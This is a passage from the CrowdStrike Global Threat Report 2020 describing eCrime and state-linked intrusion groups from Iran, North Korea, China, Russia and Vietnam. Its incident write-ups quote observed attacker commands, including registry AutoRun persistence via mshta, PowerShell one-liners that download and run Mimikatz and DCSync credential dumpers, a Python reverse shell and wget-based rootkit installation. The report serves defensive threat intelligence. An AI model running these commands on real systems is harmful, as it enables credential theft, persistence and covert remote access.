scale. In 2016 and 2017, their operations were notable because they targeted large
enterprises using initial exploitation, lateral movement and exfiltration techniques
commonly associated with nation-state actors. With the rise and dominance of BGH,
which also relies on these methods, the relative uniqueness of targeted eCrime is no
longer as apparent. In fact, the original BGH group BOSS SPIDER was tracked as a
targeted eCrime adversary until 2018.
Despite the changing criminal landscape, targeted eCrime adversaries continue to
evolve and expand their operations. They are distinguished from BGH adversaries
by their methods of monetization, which generally do not include enterprise-wide
ransomware infections. One noted exception to this is GRACEFUL SPIDER, which has
used Clop ransomware against victims. CrowdStrike Intelligence continues to evaluate
activity from this actor but tracks it as a targeted eCrime adversary at this time due to
its PoS compromises. The other named adversaries that have been linked to PoS data
compromises are CARBON SPIDER, TINY SPIDER and SKELETON SPIDER.
The adversaries that are specifically targeting financial institutions monetize
the theft of large sums via wire fraud or ATM cash-outs. In 2019, CrowdStrike
Intelligence observed an increase in such campaigns, with activity expanding
beyond the U.S., Canada and Europe to affect South and Central America and
Africa. Adversaries employing this operational model include COBALT SPIDER,
ANTHROPOID SPIDER and WHISPER SPIDER.

American and European financial institutions but also
likely expanded in scope to include Central and South
American financials.

THE ANOMALY: GRACEFUL SPIDER’S HIGH-VOLUME
OPERATIONS
Throughout the second half of 2019, GRACEFUL SPIDER disseminated GetAndGo
Loader in broad spam campaigns, primarily by using pages that impersonate
legitimate file-sharing sites to deceive users into downloading a malicious macroenabled document. GetAndGo Loader has delivered FlawedAmmyy, the Foundation
malware framework and, most recently, GRACEFUL SPIDER’s custom Remote
Access Tool (RAT) SDBBot. SDBBot has three main parts: The installer deploys the
other components and creates an auto-start execution point (ASEP) on the system;
an intermediate component called RegCodeLoader is used by the ASEP to load the
malware; and the last component is the malicious RAT payload.
GRACEFUL SPIDER conducts these campaigns at greater scale and frequency
than other targeted eCrime actors. Rather than focusing specifically on a particular
industry, the adversary has targeted organizations in almost every sector across the
globe. CrowdStrike Intelligence observed efforts to more selectively target victims in
October 2019, when the actor introduced victim IP address geolocation filtering. For
example, certain malicious landing pages only delivered malware to South Koreabased IP addresses (on October 23 and 24, 2019). This tactic has the added benefit
of interfering with automated security tools and sandboxes that do not have VPN
exit points in a targeted country.

COBALT SPIDER’S VARIATIONS IN DELIVERY METHODS
In 2019, COBALT SPIDER remained focused almost exclusively on the financial
sector. This group has used a diverse variety of dropper files to deliver the COBINT
backdoor. These droppers have included: Gemini and Leo macro documents; Virgo
exploit documents; Word documents containing OLE objects; Cancer JavaScripts;
NSIS files; backdoored versions of legitimate web browser updates; and LNK files.
In addition to regularly impersonating banks, COBALT SPIDER has repeatedly used
social engineering lures related to SWIFT (Society for Worldwide Interbank Financial
Telecommunication) and the European Central Bank (ECB). The adversary has also
employed infrastructure impersonating the ECB.
It is probable that COBALT SPIDER is also expanding its targeting scope beyond
European and North American financial institutions to include Central and South America.

CrowdStrike Intelligence observed efforts

TARGETED INTRUSION
CrowdStrike tracks numerous targeted intrusion adversaries based around the
world. Activity in this section highlights significant events attributed to actor groups
from China, Iran, Russia, DPRK, India, Pakistan and Vietnam. Targeted intrusion
activity in 2019 featured high-volume operations from DPRK-associated adversaries,
especially VELVET CHOLLIMA and LABYRINTH CHOLLIMA. Chinese adversary
activity was particularly elevated against telecommunication entities. Multiple
Russian adversaries, including PRIMITIVE BEAR and FANCY BEAR, were linked to
the targeting of Ukraine. Amid a year of rising tension between Iran and the U.S.,
Iranian adversary activity included campaigns using job and recruitment themes
spoofing a U.S.-based defense contractor, suggesting an increasing focus on
government and defense sector targeting.
Reported targeted intrusion activity in 2019 was evenly distributed across incidents
linked to Russian, Iranian and North Korean adversaries:
BEAR - 22%
KITTEN - 21%
CHOLLIMA - 18%
PANDA - 15%
LEOPARD/TIGER (Indian subcontinent) - 14%

Following these
disruptive incidents,
tracked adversaries
responded in a variety
of ways, including
adopting changes in
TTPs, scaling back
activity or continuing
to operate with largely
unchanged behavior.

Iranian state-nexus targeted intrusion activity in 2019 was broadly consistent in
tempo and targeting, despite several key events that appeared to cause limited
gaps in the operations of specific adversaries. These disruptions included a
range of purported hacktivist leaks on the activity, tools and personnel of three
separate state-nexus adversaries, as well as industry and government publications
identifying that one of those adversaries previously had been compromised by
a Russian state-nexus adversary. Following these disruptive incidents, tracked
adversaries responded in a variety of ways, including adopting changes in TTPs,
scaling back activity or continuing to operate with largely unchanged behavior.
Notable changes in TTPs included an increased reliance on social media for
reconnaissance and initial payload delivery, use of employment-themed lure
content and a greater attention to operational security in the crafting of payloads
and structure of malware C2 channels.
While activity earlier in the year focused on countries in the Middle East and
North Africa (MENA) region, the latter half of 2019 saw a pronounced shift in
targeting toward entities in the U.S., likely in response to an extended spike in
tension between Iran and the U.S. over events in the Persian Gulf that began in
May 2019. Other relevant incidents included a domestic internet shutdown in Iran
beginning in November 2019 in response to a large-scale outbreak of protests
across the country following a government decision to increase the price of fuel.
This was accompanied by allegations of a widespread campaign by the regime
targeting protesters, journalists and dissidents across social media and encrypted
messaging platforms.
Industry reporting described Iran’s continuing deployment of destructive malware,
namely wipers, against specific entities in the Middle East region. However, these
activities appeared to be limited in scale compared to past Iran-nexus destructive
operations utilizing the Shamoon wiper, and they could not be attributed to Iran with
the same confidence or detail as past destructive activities.

OVERWATCH FEATURE_

HELIX KITTEN INTRUSION
Overview
In Fall 2019, Falcon OverWatch observed a targeted intrusion in which the
victim, who had initially deployed the CrowdStrike Falcon platform to a limited
endpoint estate, was notified by the OverWatch team about a potential intrusion
that predated the installation of the Falcon sensor. This activity included an
unidentified actor remotely accessing the network with valid credentials,
harvesting credentials, performing host and network reconnaissance and
utilizing web shells to establish persistence. The deployed web shell was
a variant identified in industry reporting as IntrudingDivisor. CrowdStrike
Intelligence attributes this activity and IntrudingDivisor to the Iranian state-nexus
adversary HELIX KITTEN with high confidence.
The adversary used a combination of built-in operating system utilities, publicly
available software and custom-built tools to execute malicious activities on the
network. Throughout the intrusion, the OverWatch team noted the extensive
use of RDP, rundll32, certutil, a command-line tool used to display user
and group information, and custom web shells used for reconnaissance, lateral
movement and execution of tasks.

Initial Observations
Threat hunting initially uncovered malicious activity when hunters observed
the adversary establish an RDP session and proceed to harvest credentials by
dumping the memory of the LSASS process with built-in Task Manager. The
actor also deployed a simple encoded command-line Active Directory (AD)
scanner to display user and group information. The scanner’s file extension was
saved as C:\Temp\[REDACTED]\1.txt and was decoded via certutil as
follows prior to execution:
certutil.exe -decode 1.txt l.exe
The AD scanner was then executed in the following format:
l.exe administrators \\[REDACTED IP ADDRESS]
Furthermore, OverWatch identified that the adversary used the combination of valid
credentials and RDP to install the IntrudingDivisor web shell to three mail servers.

CROWDSTRIKE GLOBAL THREAT REPORT 2020

OVERWATCH FEATURE_
Notable Adversary Behavior
During the course of its operation, the adversary deployed a web shell
with the filename logoff.aspx and subsequently logged into that
web shell from an external address. Technical analysis of the web shell
identified it as a variant of a tool previously identified in industry reporting
as IntrudingDivisor. IntrudingDivisor is a multifunction web shell that relies
on specific numeric inputs to execute arbitrary commands, write data to a
specified file, alter access times of a specified file and read a specified file.
The tool’s industry moniker is based on its use of a specific division-based
system of numeric inputs for actor authentication and command execution.

Conclusions and Recommendations
The web shell identified during the intrusion largely conforms with the
industry reporting, but it does exhibit some notable differences. For
instance, the sample identified in this intrusion does not automatically
log the time, the client IP address or the user agent string, as discussed
in industry reports. Despite the difference in logging functionality, this
sample uses some of the same code to perform the same functionality
and employs the same hard-coded constants for authentication/command
execution as other versions of IntrudingDivisor. Industry reporting
describes IntrudingDivisor as often deployed in concert with the TwoFace
web shell, which CrowdStrike Intelligence attributes to the Iranian statenexus adversary HELIX KITTEN.
Mitigation steps to defend against threats from this intrusion include
monitoring for unexpected processes interacting with LSASS. Given the
fact that the adversary was using valid credentials over RDP, defenders
should also continuously monitor for unusual account behavior. In regard
to the web shell activity, employ process monitoring on web servers to
identify suspicious actions or file access. Defenders should also review
authentication logs and any unexpected traffic on the server.

LOOKING FORWARD
CrowdStrike Intelligence assesses with high confidence that Iranian adversaries
will continue to use cyber espionage to support traditional intelligence collection
from a variety of public and private entities, with a particular emphasis on the MENA
region and North America. The primary focus of this activity is likely to be driven
by both strategic and directed intelligence requirements related to furthering Iran’s
geostrategic goals, counteracting the effects of economic sanctions and maintaining
the stability of the regime. The latter requirements will almost certainly include
continued targeting of figures critical of the regime, both within Iran and abroad,
particularly dissidents and journalists, and may extend to disinformation campaigns
utilizing social media, similar to activity against American audiences during 2019 that
was reported to have an Iranian nexus.
Based on activity observed in 2019, Iranian cyber espionage appears to be
increasingly tasked to support gaps in military-related intelligence requirements
and achieve positional access to enable the compromise of third parties. With
that in mind, defense, maritime, telecommunications and information technology
organizations in the MENA region will likely be of particular interest to Iranian
adversaries in 2020.
Domestically, recent protests across the country and the run-up to elections
in February 2020 have exposed significant political fissures within the Iranian
body politic. As a result, it is likely that the regime will attempt to strengthen its
dominance over the information space available to its citizens, including through
further development of its national intranet and more intense targeting of internal
opposition figures, dissidents abroad and certain established political elements.

Based on activity observed in 2019, Iranian cyber
espionage appears to be increasingly tasked to support
gaps in military-related intelligence requirements and

supporting the
assessment that the
DPRK is conducting

Financial sector
targeting is believed to
be worldwide.

DPRK-based targeted intrusions represent some of the most active operations in
2019. Both VELVET CHOLLIMA and LABYRINTH CHOLLIMA sustained an elevated
operational pace throughout the year. This tempo was not only represented by
multiple observed campaigns but also by sustained development of tools and
techniques. In the case of LABYRINTH CHOLLIMA, the adversary demonstrated the
ability to compromise multiple platforms and operating systems, including Windows,
Linux, macOS and Android.
Entities within the Republic of Korea (ROK, or South Korea) continued to be of
strategic interest, particularly for RICOCHET CHOLLIMA, VELVET CHOLLIMA
and LABYRINTH CHOLLIMA. However, VELVET CHOLLIMA also targeted the
U.S. and Japan through intelligence-gathering operations focused on collecting
information on nuclear and sanctions issues. Multiple incidents targeted India,
with some activity further supporting the assessment that the DPRK is conducting
economic espionage against key industries. Financial sector targeting is believed
to be worldwide.
Not all Korea-based activity identified in 2019 could be affirmatively attributed to a
named DPRK adversary. In July 2019, Falcon OverWatch identified a NOKKI malware
sample, which precipitated detailed technical analysis of this malware. Despite
previous links to the ROK-based SHADOW CRANE, this technical analysis led to
the assessment that the malware was likely an adversary with a nexus to the DPRK
regime, with at least some relationship to VELVET CHOLLIMA. A Chrome zero-day
vulnerability (CVE-2019-13720) that was reported in November 2019 posed the same
problem for attribution. TTPs associated with this activity were observed from both
SHADOW CRANE and RICOCHET CHOLLIMA, and both of these adversaries are
suspected of having a similar target scope that includes journalists and academics
involved in Korean policy.

SECTOR HIGHLIGHT:
FINANCE AND CRYPTOCURRENCY
In addition to
supporting currency
generation, LABYRINTH
CHOLLIMA’s targeting
of cryptocurrency
exchanges could
support espionageoriented efforts
designed to collect
information on users
or cryptocurrency
operations and
systems.

As in 2018, CrowdStrike Intelligence once again observed North Korean
targeting of the finance and cryptocurrency sectors in 2019. The extent of
this targeting includes activity from all named DPRK-affiliated adversaries
— from STARDUST CHOLLIMA’s breach of payment processors to smallerscale cryptocurrency theft in VELVET CHOLLIMA’s deployment of GoldStamp
malware. LABYRINTH CHOLLIMA sustained routine operations against
cryptocurrency exchanges, and recent reporting detailed SILENT CHOLLIMA’s
use of DTrack malware to compromise ATMs in India.
Prior to 2019, RICOCHET CHOLLIMA was not reported as conducting
intrusions against this sector. However, in mid-May 2019, open sources
reported that RICOCHET CHOLLIMA used a variant of Nimbus malware against
suspected financial entities in Vietnam, Hong Kong, Russia and DPRK in late
2018. While it is unclear if this operation represented an attempt at theft of
funds, this activity, if accurate, would represent a significant expansion in the
adversary’s known target scope.
Taken together, these operations strongly suggest that all DPRK groups
represent some level of threat to the financial sector. Not only are these
adversaries engaging in small-scale currency generation activity, which
likely funds their own operations, they are also possibly contributing to
DPRK’s ability to evade international sanctions and finance its foreign and
domestic policy initiatives. In addition to supporting currency generation,
LABYRINTH CHOLLIMA’s targeting of cryptocurrency exchanges could
support espionage-oriented efforts designed to collect information on users
or cryptocurrency operations and systems. DPRK has been developing its
own cryptocurrency to further circumvent sanctions. Similarly, RICOCHET
CHOLLIMA’s targeting of financial entities could also represent efforts
designed to obtain information on the finances of a person or organization of
interest to DPRK’s intelligence services.

OVERWATCH FEATURE_

VELVET CHOLLIMA INTRUSION
Overview
The OverWatch team observed multiple spear-phishing attacks against targets
to deploy the CHOLLIMA-associated malware known as BabyShark. According
to CrowdStrike Intelligence, VELVET CHOLLIMA has been employing BabyShark
since at least August 2018. Delivery is typically via phishing messages with
Microsoft Office document attachments containing a macro to download a
BabyShark HTML Application (HTA) file, though Windows executables have also
been observed.

Initial Observations
In one such intrusion in early 2019, OverWatch identified requests to download
a BabyShark HTA file from a compromised (otherwise legitimate) domain.
The resulting file ultimately downloaded an encoded VBScript, which was
used to attempt further tasking and downloading of additional tools from the
compromised domain. The activity also included launching the TeamViewer
Portable application. OverWatch’s quick identification of the threat allowed
defenders to take action before the adversary was able to perform interactive
command execution.
In mid-2019, VELVET CHOLLIMA conducted another intrusion. The targeted
user received a highly tailored spear-phishing email with a malicious decoy Word
document attachment. The first-stage payload was retrieved with a file name of
Drfwj0.hta via mshta.exe from the actor-controlled domain
https://bit-albania[.]com.

Notable Adversary Behavior
Analysis of Drfwj0.hta found it to be an executable HTA file written in VBScript
that acted as a BabyShark downloader. It downloaded and decoded another
payload using a custom decoding algorithm from the same domain (https://bitalbania[.]com).

CROWDSTRIKE GLOBAL THREAT REPORT 2020

OVERWATCH FEATURE_
This payload decoded to a VBScript, which was Stage 1 of the VELVET CHOLLIMA
BabyShark implant. The script also configured a persistence mechanism by setting
an autorun key to download and execute the second-stage HTA downloader
whenever cmd.exe is run:
reg add "HKEY_CURRENT_USER\Software\Microsoft\Command Processor"
/v AutoRun /t REG_SZ /d "powershell.exe start-process
-windowstyle hidden -filepath mshta.exe https://bit-albania[.]
com/[REDACTED]/Drfwj.hta" /f
The script then modified registry settings associated with Microsoft Office to
suppress VBA warnings regarding macros, doing so by forcing the creation of the
same associated Registry value for three different versions of MS Word. Rather
than first checking which version of MS Office was installed, the script ran registry
modification commands for multiple versions to ensure the changes took effect.
The script also performed basic discovery commands. Output from the discovery
commands was saved to %APPDATA%\Microsoft\ttmp.log before being base64encoded and uploaded to:
https://bit-albania[.]com/BackUps/[REDACTED]/upload.php
Finally, the script created scheduled tasks with SYSTEM-level privileges that
essentially launch cmd.exe to trigger the persistence mechanism.
The second-stage HTA downloader, Drfwj.hta, then retrieved the second stage of
the BabyShark implant from:
https://bit-albania[.]com/BackUps/[REDACTED]/expres.php?op=2
The second stage was a VBScript that executed more host discovery and checked
if the adversary wanted to deploy additional modules.

Conclusions and Recommendations
Due to the organization’s timely response in containing the host, further malicious
activity, including credential dumping or lateral movement, was not observed.
Like many other targeted adversaries, VELVET CHOLLIMA often employs similar
spear-phishing techniques to socially engineer its intended victims. Therefore,
user awareness and education are essential to limit vulnerability to customized
phishing lures. In addition, robust monitoring, detection and threat hunting are vital
to ensuring an effective network defense posture.

DPRK_

LOOKING FORWARD
On December 27, 2019, a judge in the U.S. District Court for the Eastern District
of Virginia unsealed a civil case filed against two John Does associated with
VELVET CHOLLIMA. This action resulted in the seizure of about 50 domains
used by VELVET CHOLLIMA to conduct web-based credential harvesting and to
use as C2 for the custom tools GoldGrabber and BabyShark. Concurrently, the
closing months of 2019 saw a reduction in the number of BabyShark operations
observed by CrowdStrike Intelligence. That said, previous legal actions against
DPRK adversaries have done little to slow their operations, and CrowdStrike
Intelligence expects VELVET CHOLLIMA to continue targeting government, nongovernmental organizations (NGOs) and academic entities working on nuclear
nonproliferation issues.
This target scope is particularly relevant considering that diplomatic relations
between DPRK and the U.S. cooled over the course of 2019. As the year-end
deadline for nuclear negotiations approached in December, North Korea accused
the U.S. of dragging its feet, and then announced it would no longer be bound by
limitations on its weapons testing. While disruptive cyber activity against the U.S.
has not been observed, a return to harsher rhetoric only further supports the
assessment that DPRK-affiliated adversaries will continue at the current pace
of operations. Because sanctions relief is unlikely, these operations will very
likely include further targeting of the financial sector, particularly cryptocurrency
exchanges, as cryptocurrency can be used outside of conventional banking
platforms. There may also be a return to more military-based targeting if
tensions escalate in 2020.

While disruptive cyber activity against the U.S. has not

Activity attributed to

included supply
chain compromises,
demonstrating China’s
continued use of this
tactic to identify and
infect multiple victims.

Chinese adversary activity was steady throughout 2019, with a prominent focus on
the telecommunications sector. Healthcare entities were also included, providing
further evidence that Chinese targeted intrusions are enabling corporate espionage
of information vital to bolstering these key industries domestically. China also
continued to target the government and defense sectors of regional neighbors, with
a concentrated focus on Southeast Asia late in the year.
Both CrowdStrike Intelligence analysis and multiple public reports revealed malicious
cyber activity targeting minority populations, such as Tibetans and Uyghurs. China
also used computer network operations designed to impede the citizen protests
in Hong Kong that occurred in the latter half of 2019. The range of these activities
runs the gamut from use of iOS exploits and strategic web compromises (SWCs), to
distributed denial of service (DDoS) attacks and influence operations.
The majority of observed activity has been attributed to adversaries that CrowdStrike
Intelligence has assessed to be supporting or working for China’s Ministry of State
Security (MSS). CrowdStrike identified numerous active WICKED PANDA infections
in the first half of the year, then additional new malware samples in Q3 and Q4 2019,
even after industry reporting detailed WICKED PANDA (aka APT 41) operations.
Activity attributed to WICKED PANDA and a possible CIRCUIT PANDA operation
included supply chain compromises, demonstrating China’s continued use of this
tactic to identify and infect multiple victims. Additional evidence has indicated that
some older named adversaries have reemerged; these include PIRATE PANDA and
STALKER PANDA, both of which were unobserved in 2018.
It is suspected that actors associated with the People’s Liberation Army (PLA)
remain active, although CrowdStrike Intelligence’s current visibility into their
targeting and TTPs is limited. LOTUS PANDA is associated with the PLA Strategic
Support Force (PLASSF) at low confidence, and the return of hibernating
adversaries like STALKER PANDA and PIRATE PANDA — neither of which have
been associated with MSS — may herald a resurgence of more PLA-aligned actors.
Several unnamed but suspected Chinese activities were identified, but due to the
use of publicly available toolsets, attribution remains undetermined. This activity
underscores how China’s use of open-source and LOTL TTPs continues to be a
highly effective means of inhibiting analysis and remediation efforts.

WICKED PANDA INTRUSIONS
Overview
In early 2019, the Falcon OverWatch team observed increased WICKED
PANDA activity across various verticals, including the hospitality, technology,
telecommunications and gaming industries. These intrusions exhibited a
high operational tempo, a plethora of attack techniques and a custom toolkit
developed to support stealthy intrusion operations on Windows- and Linuxbased systems.

Initial Observations
During one WICKED PANDA intrusion, OverWatch identified extensive use of
LOTL techniques. The threat actor accessed a domain controller, via RDP, using
previously acquired credentials and performing initial host reconnaissance followed
by installation of a malicious implant and credential theft. As the company expanded
endpoint visibility into the environment by deploying the CrowdStrike Falcon
platform, OverWatch monitoring progressed and the extent of the intrusion became
apparent, with evidence of a strong adversary foothold and lateral movement across
the network.

Notable Adversary Behavior
The adversary used the Background Intelligent Transfer Service (BITS) to download
and install an implant hosted on a legitimate third-party website. The threat actor
renamed the implant as f.exe and copied it to the root directory of the system drive
on the compromised domain controller, and subsequently executed the implant with
a command-line-supplied password used to decrypt the malicious payload. Once
decrypted, as part of the implant’s installation chain, a temporary file was written
to the %temp% directory. In its final stage, the temporary file was executed via
rundll32.exe and acted as a loader for the main malicious payload, a variant of
the Winnti RAT.
Having installed the implant with SYSTEM privileges, the adversary terminated the
RDP session, and shortly after, returned to the system through the recently installed
malicious implant to harvest credentials with PowerShell Empire cmdlets:

OVERWATCH FEATURE_
powershell -ep Bypass -NoP -NonI -NoLogo -W Hidden -c IEX
(New-Object Net.WebClient).DopireProjeing('https://raw.
githubusercontent.com/EmpireProject/Empire/master/data/
module_source/credentials/Invoke-DCSync.ps1');Invoke-DCSync
-PWDumpFormat
Note that the command line appears to be corrupted with the DownloadString
cmdlet rendered as DopireProjeing, leading to a PowerShell method invocation
failure. Immediately after, the threat actor attempted to run the Invoke-Mimikatz
cmdlet, this time using a correctly formatted command line and a different
repository:
powershell "IEX (New-Object Net.WebClient).
DownloadString('https://raw.githubusercontent.com/
mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.
ps1'); Invoke-Mimikatz -DumpCreds"
Throughout the intrusion, the threat actor continued to execute malicious implants
by using a combination of acquired valid credentials and BITS or PowerShell
cmdlets to download and execute commands on the local systems. However, in one
instance, OverWatch identified the attempts to use a different technique known as
DLL search order hijacking to execute the Winnti RAT.
The adversary first copied the implant file to a remote system by using Windows
Admin Shares:
\[REDACTED]\c$\windows\apphelp.dll
It then executed the explorer.exe process that loads apphelp.dll via creation
of a scheduled task:
schtasks /create /s [REDACTED] /ru "NT Authority\System" /tn
[REDACTED] /tr "c:\windows\explorer.exe" /sc once /st 11:37
The malicious implant contained an embedded malicious driver. In order to combat
a Windows’ restriction requiring any driver on 64-bit systems to be signed by a
Microsoft-verified cryptographic signature, the adversary had signed the driver with
a legitimate (most likely stolen) certificate from another company.
In a separate WICKED PANDA intrusion, OverWatch observed the adversary
deploying its tools, including a user-mode rootkit, on a Linux server. The activity was
conducted using a simple Python reverse shell:

54

CROWDSTRIKE GLOBAL THREAT REPORT 2020

55

CHINA_

OVERWATCH FEATURE_
python /tmp/back.py [IP Address REDACTED] 9091
The threat actor downloaded a simple malware loader with an embedded
Winnti implant and a customized version of a publicly available user-mode
rootkit, which was configured to load via the LD_PRELOAD technique:
wget [IP Address REDACTED]:82/libsshd.so
sudo ./install
cp ./libsshd.so /lib/x86_64-linux-gnu/libsshd.so
-chmod 777 /lib/x86_64-linux-gnu/libsshd.so
Successful installation of the rootkit adds the following entry of /$LIB/
libsshd.so to the /etc/ld.so.preload file. This allows the usermode rootkit to load and precede function calls responsible for stealthy
operations on a system, such as anti-debugging, hiding files and network
connections, remote access and cleaning up authentication log entries.

Conclusions and Recommendations
Due to WICKED PANDA’s propensity to steal and reuse valid credentials,
defenders should actively hunt and monitor for suspicious user,
administrator and service account behavior across the network. While
LOTL techniques are challenging to defend against, some actions can
mitigate the threat. For example, relevant to this case, limit PowerShell’s
execution policy as much as is reasonably possible. Also, monitor for
execution of rundll32.exe in unusual circumstances or with abnormal
arguments. While defending against rootkits is similarly difficult, it is
always wise to ensure antivirus software is enabled with proper prevention
policies, and continuously hunt for unexpected DLLs and services.

SECTOR HIGHLIGHT:
TELECOMMUNICATIONS
In addition to
supporting currency

CHOLLIMA’s targeting
of cryptocurrency
exchanges could
support espionageoriented efforts
designed to collect
information on users
or cryptocurrency
operations and
systems.

Multiple Chinese adversaries — including LOTUS PANDA, WICKED PANDA and
EMISSARY PANDA — were linked to the targeting of the telecommunications
sector in 2019. Other incidents, which were notable for the use of publicly available
tools, remain unattributed but appear to support China’s efforts against this sector.
CrowdStrike Intelligence assesses that China’s interest in targeting this sector has
arisen along with a need to target upstream providers to support its traditional and
economic espionage goals.
The power of telecom data to espionage agencies was illustrated by the malware
known as MESSAGETAP, which was reportedly used by WICKED PANDA to monitor
short message service (SMS) traffic from telecom networks. MESSAGETAP can
collect and store SMS data based on selection criteria, including phone numbers,
international mobile subscriber identity (IMSI) numbers and keywords. The ability
to collect data based on specific phone numbers and IMSI numbers indicates that
the adversary predetermined which individuals to target for collection, possibly
identifying phone numbers in previous reconnaissance or collection activities.
Incidents from 2019 include multiple compromises of telecom companies in Asia,
showing a continued interest in regional neighbors. While these incidents may
also support traditional or economic espionage goals, open-source reporting from
September 2019 claimed that some targeted intrusions against telecoms were used
by China to track Uyghurs in Central and Southeast Asia. This activity reportedly
targeted telecom operators in Turkey, Kazakhstan, India, Thailand and Malaysia —
mirroring the observed target scope for tracked Chinese adversaries.
Telecom sector targeting — especially in the Central and Southeast Asia regions
— would also complement China’s plan to develop a Digital Silk Road. This
initiative aims to broaden and deepen digital connections to other nations via the
construction of cross-border and submarine optical cables, communication trunks
and satellite information passageways, and the development of fifth-generation
(5G) mobile networks. Regarding 5G technology specifically, multiple governments
(including the United States) have taken note and refused opportunities to work with
Huawei, citing concerns over the company’s associations to military and intelligence
services in China, Russia and DPRK.

CHINA_

LOOKING FORWARD
The publication of WICKED PANDA-associated activities, as well as the
IntrusionTruth reporting on KRYPTONITE PANDA (reported in January 2020),
may have a cooling effect on the MSS’s reliance on using contract entities in the
near-term, but CrowdStrike Intelligence expects a return to operations will occur
after tactics are reviewed and updated. Targeting by actor groups associated with
the MSS will likely continue to focus on maintaining access to upstream telecom
providers, as well as developing new supply chain compromises.
CrowdStrike Intelligence anticipates that the first draft of China’s next Five-Year Plan
(FYP) will be released in early 2020. This draft is only the first step before a final
version is agreed upon in 2021; however, the initial proposal may contain clues about
the future priorities of the Chinese Communist Party (CCP) and will help launch
planning in numerous CCP agencies. Part of the previous FYP outlined key industries
for domestic growth, a vital indication of which sectors are at an increased risk
of IP theft. Despite the U.S.’s request for controls on IP theft and corporate
espionage, the targeting of U.S. companies engaged in key industries deemed vital
to China’s strategic interests — including clean energy, healthcare, biotechnology,
pharmaceuticals and others — is likely to continue. CrowdStrike Intelligence
assesses this is likely despite announcements from Washington and Beijing that a
limited trade deal may bring an end to the U.S.-China trade war.
China’s improving disinformation efforts will continue to have an immediate effect in
Hong Kong and Taiwan following their resistance to CCP and support of democratic
values throughout 2019 and into 2020. These campaigns will augment China’s robust
targeted intrusion resources when dealing with regional neighbors. Western companies
are likely to be caught in the middle, between domestic audiences supporting human
rights (if only nominally) and pressures from the CCP to bow to censorship. As both
Taiwan and Hong Kong are seen by the CCP as “domestic” interference and testing
grounds for China-backed cyber operations, they likely foreshadow China’s interest in
fomenting unrest and conducting disinformation campaigns on Western democratic
elections such as the U.S. presidential election in November 2020.

RUSSIA
In 2019, observed Russian computer network operations targeting Ukraine were
a predominant feature of targeted intrusions overall. This activity included highvolume PRIMITIVE BEAR activity throughout the year and limited FANCY BEAR
spear-phishing campaigns in the fall. These campaigns likely are designed to provide
Russian leaders with the information they need to make informed decisions going
into diplomatic negotiations, or they may be used tactically by Russia-affiliated
forces for battlefield intelligence.
CrowdStrike Intelligence continued to conduct technical analysis of VENOMOUS
BEAR’s highly sophisticated toolset. Two tools — Facade and Blueprint — are
backdoors that act as mail plugins, communicating to a C2 server via specially
crafted email attachments. Facade began as an email logger used within
VENOMOUS BEAR’s Chinch malware framework, but in 2018, it was used as
a fully fledged backdoor. Blueprint operates in a similar fashion but is installed
as a Microsoft Exchange transport agent, a legitimate component of Microsoft
Exchange Server. Analysis of the most recent activity attributed to VENOMOUS
BEAR indicated that the adversary continues to use the Chinch and Snake malware
frameworks, as well as the AesLoader and the Skipper backdoor.

RUSSIA_

LOOKING FORWARD
Information pertaining to Ukrainian government and military entities is a known
standing intelligence objective for numerous Russian intelligence organizations, and
the high-volume operations of PRIMITIVE BEAR — as well as the late-2019 focus of
FANCY BEAR — are indicative of this mission. As Ukraine and Russia work toward
ending a five-year conflict, it is likely that Russia-affiliated intelligence collection
operations will continue — if not increase — in the future.
On December 9, 2019, the World Anti-Doping Agency (WADA) concluded that the
Russian Anti-Doping Agency (RUSADA) was not in compliance with international
regulations governing clean participation in sports, and as a result, the Russian
government would be banned from participating in or hosting international athletic
competitions for four years and face a fine. CrowdStrike Intelligence notes that
Russian state-nexus adversaries and pro-Russian information operation (IO) fronts
have taken aim at sports regulatory bodies, athletes and events following such bans
in the past in retaliation for the exclusion of Russian athletes from international
competitions. Based on this historical precedent, CrowdStrike Intelligence assesses
that it is highly likely that Russia will respond with targeted intrusions and/or
information operations targeting these organizations. Specific targets may include
entities with a nexus to the 2020 Tokyo Olympic Games.

As Ukraine and Russia work toward ending
a five-year conflict, it is likely that Russiaaffiliated intelligence collection operations will
continue — if not increase — in the future.

VIETNAM
In late 2018, Vietnam-based OCEAN BUFFALO was implicated in intrusion activity
targeting the automotive manufacturing sector. This departure from OCEAN
BUFFALO’s target scope of geopolitical intelligence gathering and reconnaissance
indicated that Vietnam also has an economic espionage program. Since this time,
unconfirmed third-party reporting released details of suspected OCEAN BUFFALO
intrusions against automotive sector entities in Germany and South Korea beginning
in Spring 2019. Such targeting coincided with 2019 initiatives from the Vietnam
Ministry of Industry and Trade designed to support domestic auto projects. At
the same time, Vietnamese authorities announced the goal for its auto industry
to produce 35% to 40% of domestic auto components by 2020, an increase from
10%. In March 2019, Vietnam also announced its first made-in-Vietnam automobile,
produced by VinFast.
CrowdStrike Intelligence has assessed that the Vietnam Cyberspace Operations
Command (Command 86), which was established in January 2018, likely represents
the country’s premier entity for computer network operations. This assessment
carries moderate confidence, as it is based on open-source reporting and brief
statements made by Vietnamese officials. Notably, while the components that make
up Command 86 are under the direct administration of Vietnam’s Ministry of National
Defense (MND), statements from a March 2018 military conference characterized
Command 86 as an affiliate of the MND and revealed that its Communist Party of
Vietnam (CPV) organization reports directly to the Central Military Commission
(CMC), which oversees the MND.
New missions for this organization began in April 2018, a few months prior
to when OCEAN BUFFALO operations against the automotive industry were
observed. Additionally, Command 86’s predecessor organization, the General Staff
Department’s Information Technology Department, was founded in 2011, less than a
year before the first OCEAN BUFFALO activity was observed. As new information
comes to light showing potential new overlaps between Command 86 and OCEAN
BUFFALO, these factors will be taken into account in further considerations of the
potential connection between the two.

OVERWATCH FEATURE_

OCEAN BUFFALO INTRUSION
Overview
In early 2019, OverWatch threat hunting uncovered a targeted intrusion attributed
to OCEAN BUFFALO. OverWatch observed several notable TTPs, including
process hollowing, the referencing of video game characters when naming
malicious services and the targeting of email inboxes of senior executives.

Initial Observations
Threat hunting across the organization’s network first identified activity
associated with Cobalt Strike on the network, indicating an infection that
predated deployment of the CrowdStrike Falcon platform. Hunters found Cobalt
Strike payloads running on multiple hosts, hollowing the memory space of
various legitimate processes — including Microsoft Word, rundll32.exe and
the Windows Server tool esentutl.exe — in order to load.

Notable Adversary Behavior
OCEAN BUFFALO actors also leveraged renamed versions of Sysinternals
DebugView (dbgview.exe) to load the malicious payloads using a naming
scheme based on characters from the popular Pokemon video game series. For
example, the following malicious service named “herdierbulbasaur” was installed
and configured to execute via a renamed version of dbgview.exe:
